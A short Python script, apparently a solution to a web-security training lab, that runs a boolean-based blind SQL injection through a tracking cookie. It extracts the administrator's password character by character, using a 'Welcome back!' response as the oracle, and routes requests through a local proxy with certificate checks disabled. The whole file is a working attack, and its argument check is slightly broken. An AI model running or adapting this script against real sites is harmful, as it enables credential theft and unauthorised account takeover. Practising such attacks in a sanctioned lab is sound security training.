import urllib.parse

import requests
import sys
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http': 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range (1,21):
        for j in range (32,126):
            payload = "'and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--'" %(i,j)
            payload_encoded = urllib.parse.quote(payload)
            cookie = {'TrackingId' : 'vvSKWzE0wRNVzox1'+ payload_encoded , 'session': 'UsHG92QZhSYyRj4dQJtdty9kkIfTwbJY'}
            r = requests.get (url, cookies=cookie, verify=False, proxies=proxy )
            res = r.text
            if "Welcome back!" not in res:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv[0]) != 2:
        print("[-] Usage : %s <url> " % sys.argv[0])
        print("[-] Example : %s www.example.com" %sys.argv[0])
    url = sys.argv[1].strip()
    print("[+] Running SQLi on admin password")
    sqli_password(url)


if __name__=="__main__":
    main()